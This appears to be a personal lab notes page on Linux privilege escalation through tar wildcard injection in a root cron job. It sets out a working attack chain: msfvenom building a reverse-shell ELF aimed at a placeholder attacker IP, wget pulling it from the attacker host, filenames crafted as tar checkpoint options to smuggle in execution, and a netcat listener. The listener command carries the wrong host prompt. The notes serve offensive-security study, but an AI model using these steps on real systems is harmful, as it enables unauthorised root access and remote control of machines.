<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Wildcards</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Wildcards</h1><br />• When a wildcard character (*) is provided to a command as part of an
    argument, the shell will first perform filename expansion (also known as globbing) on the wildcard.<br />• This
    process replaces the wildcard with a space-separated list of the file and directory names in the current
    directory.<br /> <span style="color:#a5452a;">examples:</span><br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;echo&nbsp;*</div>
    </div><br /> <a href=""><img src="images/1304-1.png" alt="images/1304-1.png" /></a><br />• filename expansion
    happens before the command is executed, it is possible to pass command line options (e.g. -h, --help) to commands by
    creating files with these names.<br /> Filenames are not simply restricted to simple options like -h or
    --help.<br /> ◇ <strong>GTFOBins</strong> ( <a href="https://gtfobins.github.io" target="_blank">https://gtfobins.github.io</a>) can
    help determine whether a command has command line options which will be useful for our purposes.<br /><br />1. View
    the <span style="color:#1e90ff;">cronJobs</span> of the system-wide crontab:<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;cat&nbsp;/etc/crontab</div>
    </div><br /> <a href=""><img src="images/1304-2.png" alt="images/1304-2.png" /></a><br />2. View the contents of the
    /usr/local/bin/compress.sh file:<br /> <a href=""><img src="images/1304-3.png" alt="images/1304-3.png" /></a><br />
    Note that the tar command is run with a <span style="color:#00ff00;">wildcard</span> in the /home/user
    directory.<br /> In tar, there are “checkpoint” flags, which allow you to execute actions after a specified number
    of files have been archived.<br /> The <span style="color:#00ff00;">wildcard</span> for tar will call these
    checkpoints.<br />4. <a href="https://gtfobins.github.io/gtfobins/tar/">GTFOBins</a> shows that tar has command line
    options which can be used to run other commands as part of a checkpoint feature.<br /> <a href=""><img
        src="images/1304-4.png" alt="images/1304-4.png" /></a><br />5. Use msfvenom(attacker machine) to create a
    reverse shell ELF payload:<br />
    <div class="codebox">
      <div class="codebox">
        attacker@kali:/#&nbsp;msfvenom&nbsp;-p&nbsp;linux/x64/shell_reverse_tcp&nbsp;LHOST=&lt;IPattacker&gt;&nbsp;LPORT=53&nbsp;-f&nbsp;elf&nbsp;-o&nbsp;shell.elf<br />attacker@kali:/#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer
      </div>
    </div><br />6. Create two files in the /home/user directory and make shell.elf executable:<br />
    <div class="codebox">
      <div class="codebox">
        target@debian:~$&nbsp;cd&nbsp;/home/user/<br />target@debian:~$&nbsp;wget&nbsp;http://[attackerIp]/shell.elf<br />target@debian:~$&nbsp;chmod&nbsp;+x&nbsp;/home/user/shell.elf<br />#create&nbsp;a&nbsp;checkpoint&nbsp;for&nbsp;every&nbsp;file&nbsp;that&nbsp;is&nbsp;processed<br />target@debian:~$&nbsp;touch&nbsp;/home/user/--checkpoint=1<br />#action&nbsp;to&nbsp;run&nbsp;for&nbsp;every&nbsp;checkpoint<br />target@debian:~$&nbsp;touch&nbsp;/home/user/--checkpoint-action=exec=shell.elf
      </div>
    </div><br /> First we will specify that for every file that has been archived, there is a checkpoint. Then we give
    an action to that checkpoint.<br /> When the <span style="color:#00ff00;">wildcard</span> will be read, it will read
    the checkpoint<br />9. Run a netcat listener on the attacker machine and wait for the <span
      style="color:#1e90ff;">cron job</span> to run.<br />
    <div class="codebox">
      <div class="codebox">target@debian:~$&nbsp;nc&nbsp;-nvlp&nbsp;53</div>
    </div><br /> Because it is a <span style="color:#1e90ff;">cronjob</span> we have to wait some time before we receive
    a connection <br /> <a href=""><img src="images/1304-5.png" alt="images/1304-5.png" /></a><br />
  </div>
</body>

</html>